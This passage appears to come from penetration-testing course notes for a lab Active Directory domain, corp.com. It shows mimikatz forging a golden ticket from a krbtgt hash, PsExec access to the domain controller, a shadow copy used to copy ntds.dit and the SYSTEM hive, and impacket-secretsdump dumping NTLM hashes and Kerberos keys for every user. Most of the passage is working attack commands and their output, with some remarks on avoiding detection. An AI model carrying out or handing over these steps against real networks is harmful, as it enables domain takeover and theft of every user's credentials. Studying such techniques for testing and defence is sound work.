Take the hash and return to your jen computer on CLIENT74.

```console
PS C:\Tools> .\mimikatz.exe

mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

// supply the domain sid (which we can gather with whoami /user)

mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
User      : jen
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
Lifetime  : 4/25/2024 1:25:30 PM ; 4/23/2034 1:25:30 PM ; 4/23/2034 1:25:30 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jen @ corp.com' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF77477B800


PS C:\Tools\SysinternalsSuite> .\PsExec.exe \\dc1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.887]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::dc29:d103:4373:df46%14
   IPv4 Address. . . . . . . . . . . : 192.168.214.70
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.214.254

C:\Windows\system32>whoami
corp\jen

// Now let's use the whoami command to verify that our user jen is now part of the Domain Admin group.

C:\Windows\system32>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes    
=========================================== ================ ============================================ ===============================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                      Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
CORP\Domain Admins                          Group            S-1-5-21-1987370270-658905905-1781884369-512 Mandatory group, Enabled by default, Enabled group
CORP\Group Policy Creator Owners            Group            S-1-5-21-1987370270-658905905-1781884369-520 Mandatory group, Enabled by default, Enabled group
CORP\Schema Admins                          Group            S-1-5-21-1987370270-658905905-1781884369-518 Mandatory group, Enabled by default, Enabled group
CORP\Enterprise Admins                      Group            S-1-5-21-1987370270-658905905-1781884369-519 Mandatory group, Enabled by default, Enabled group
CORP\Denied RODC Password Replication Group Alias            S-1-5-21-1987370270-658905905-1781884369-572 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\High Mandatory Level        Label            S-1-16-12288                                               
```

Jen is now a member of multiple powerful groups, including domain admins!

If we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked. This is illustrated in the listing below.

### Shadow Copies

As domain admins, we can abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database NTDS.dit database file. Once we've obtained a copy of the database, we need the SYSTEM hive, and then we can extract every user credential offline on our local Kali machine.

```console
kali$ xfreerdp /cert-ignore /u:jeffadmin /v:192.168.214.70 /drive:shared,/tmp /d:corp.com

PS C:\Tools> .\vshadow.exe -nw -p  C:

VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
Copyright (C) 2005 Microsoft Corporation. All rights reserved.


(Option: No-writers option detected)
(Option: Persistent shadow copy)
(Option: Create shadow copy set)
- Setting the VSS context to: 0x00000019
Creating shadow set {d221eea3-d363-446b-aaf1-6ac6d64ee86d} ...
- Adding volume \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\] to the shadow set...
Creating the shadow (DoSnapshotSet) ...
(Waiting for the asynchronous operation to finish...)
Shadow copy set succesfully created.

List of created shadow copies:


Querying all shadow copies with the SnapshotSetID {d221eea3-d363-446b-aaf1-6ac6d64ee86d} ...

* SNAPSHOT ID = {e1c0b7f3-a7fc-466d-9919-5159cee525e5} ...
   - Shadow copy Set: {d221eea3-d363-446b-aaf1-6ac6d64ee86d}
   - Original count of shadow copies = 1
   - Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
   - Creation Time: 4/25/2024 4:51:33 PM
   - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2  // TAKE NOTE OF THIS NAME!!!!
   - Originating machine: DC1.corp.com
   - Service machine: DC1.corp.com
   - Not Exposed
   - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
   - Attributes:  No_Auto_Release Persistent No_Writers Differential


Snapshot creation done.

// take note of the "Shadow copy device name"

// you might have to do this in cmd instaad of powershell.... try cmd if you get errors:)

PS C:\Tools> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

PS C:\Tools> reg.exe save hklm\system c:\system.bak
```

Move the two .bak files to Kali.

```console
kali$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 98d2b28135d3e0d113c4fa9d965ac533
[*] Reading and decrypting hashes from ntds.dit.bak 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eb9131bbcdafe388b4ed8a511493dfc6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
stephanie:1104:aad3b435b51404eeaad3b435b51404ee:d2b35e8ac9d8f4ad5200acc4e0fd44fa:::
jeff:1105:aad3b435b51404eeaad3b435b51404ee:2688c6d2af5e9c7ddb268899123744ea:::
jeffadmin:1106:aad3b435b51404eeaad3b435b51404ee:e460605a9dbd55097c6cf77af2f89a03:::
iis_service:1109:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::
WEB04$:1112:aad3b435b51404eeaad3b435b51404ee:6ce7a763842704c39101fea70b77a6bc:::
FILES04$:1118:aad3b435b51404eeaad3b435b51404ee:024e0b5bc4f09a8f909813e2c5041a2c:::
CLIENT74$:1121:aad3b435b51404eeaad3b435b51404ee:31b5ed7d0a3a698d412c2d7d5aa2aca8:::
CLIENT75$:1122:aad3b435b51404eeaad3b435b51404ee:83582e1d6c859ac47dc703bbe72bfe73:::
pete:1123:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
jen:1124:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
CLIENT76$:1129:aad3b435b51404eeaad3b435b51404ee:c06a3d3d9dfe4af367e7a2ea975274b7:::
[*] Kerberos keys from ntds.dit.bak 
Administrator:aes256-cts-hmac-sha1-96:56136fd5bbd512b3670c581ff98144a553888909a7bf8f0fd4c424b0d42b0cdc
Administrator:aes128-cts-hmac-sha1-96:3d58eb136242c11643baf4ec85970250
Administrator:des-cbc-md5:fd79dc380ee989a4
DC1$:aes256-cts-hmac-sha1-96:3a7eed97e5f097bfe765dd31dad3586aef70aaacaa2423840aa40c5596f4b3b7
DC1$:aes128-cts-hmac-sha1-96:f49c5a4a9b383f10f83593050542a55a
DC1$:des-cbc-md5:2568d502e564801f
krbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
krbtgt:des-cbc-md5:683bdcba9e7c5de9
dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
dave:des-cbc-md5:1a329b4338bfa215
stephanie:aes256-cts-hmac-sha1-96:bacff5a5fbda4c38b58b343a5bc235021a366512d0aebf464662d0fe65fceb9f
stephanie:aes128-cts-hmac-sha1-96:95218fc23b3e0784931a3ed38f6fdc60
stephanie:des-cbc-md5:31ae1c9d3225da25
jeff:aes256-cts-hmac-sha1-96:9af9aa5a4271ee27c111a40e16260ae8394bdb899d1b49771fbe110fa7982fd1
jeff:aes128-cts-hmac-sha1-96:8957241e5ebb8321ccd595662a5a98d2
jeff:des-cbc-md5:c8bff7f79283c138
jeffadmin:aes256-cts-hmac-sha1-96:d6754b8ed7a9cb4ba2793aae0b77dac971fba194857843f97579e5fda7f682ab
jeffadmin:aes128-cts-hmac-sha1-96:9f9c0be62237491d9eeeeb32d0f5eb1e
jeffadmin:des-cbc-md5:d3b92f5eceecec86
iis_service:aes256-cts-hmac-sha1-96:9fccc377d0bc13ca49bca6725a9af461f2ca65db4e03aa0ddb8969ab716052cc
iis_service:aes128-cts-hmac-sha1-96:a4e7665d09c998d270ab363ed5db9919
iis_service:des-cbc-md5:e5ba07c82fdc8c3b
WEB04$:aes256-cts-hmac-sha1-96:af02f21345387c1dab135392282fb98a781e9b582600de925833143e65104ebc
WEB04$:aes128-cts-hmac-sha1-96:4192f73bd75fc9d5ab09407edd469825
WEB04$:des-cbc-md5:973ef4f4fd233786
FILES04$:aes256-cts-hmac-sha1-96:9d0c4c86b754f4486511f1a2d3675611ed83fb9c72bc9e3fc733489c4abcd528
FILES04$:aes128-cts-hmac-sha1-96:4dc6cd3a10be64c52deb6c55afa56925
FILES04$:des-cbc-md5:8a4620f20b322025
CLIENT74$:aes256-cts-hmac-sha1-96:ec1c97922e4e5274d32ef497019d570f2372ddd854ac57ca08913a0bd2ae38a6
CLIENT74$:aes128-cts-hmac-sha1-96:911b1c2ba00bfb39db0c5ec4eb1e1138
CLIENT74$:des-cbc-md5:b9bf134c1c207658
CLIENT75$:aes256-cts-hmac-sha1-96:5e68be7a2d38cd7a43bec49cfa28547201f639c4135b954cfc49ba91d8bc6fc3
CLIENT75$:aes128-cts-hmac-sha1-96:1993c6e121e27a8eadf70a6ce32bc325
CLIENT75$:des-cbc-md5:f749c849b92f32f1
pete:aes256-cts-hmac-sha1-96:27eb48bb2bfe936b430c6de8a7f550caa0f1827f98360179d9a88fdd0b511364
pete:aes128-cts-hmac-sha1-96:e193f9ac58c54f8441fa60bfe332d68b
pete:des-cbc-md5:167a70ced398a4c8
jen:aes256-cts-hmac-sha1-96:e7888faaee7503efe4888e146c7c24bb87507a33ce449b2e85805988f35daf99
jen:aes128-cts-hmac-sha1-96:5dafc32c5844d2a3c89ffcc7409ad7e4
jen:des-cbc-md5:4985324658587557
CLIENT76$:aes256-cts-hmac-sha1-96:5c935c36be126e0ddbc4dadf3bef247b380f38988938091c3c642be00b985838
CLIENT76$:aes128-cts-hmac-sha1-96:bcc8425cf7f37a699df031acf8c12d55
CLIENT76$:des-cbc-md5:dce683e3409b9402
[*] Cleaning up... 
```

We managed to obtain NTLM hashes and Kerberos keys for every AD user. We can now try to crack them or use as-is in pass-the-hash attacks.

While these methods might work fine, they leave an access trail and may require us to upload tools. An alternative is to abuse AD functionality itself to capture hashes remotely from a workstation. To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user, using the DC sync method described in the previous Module. This is a less conspicuous persistence technique that we can misuse.
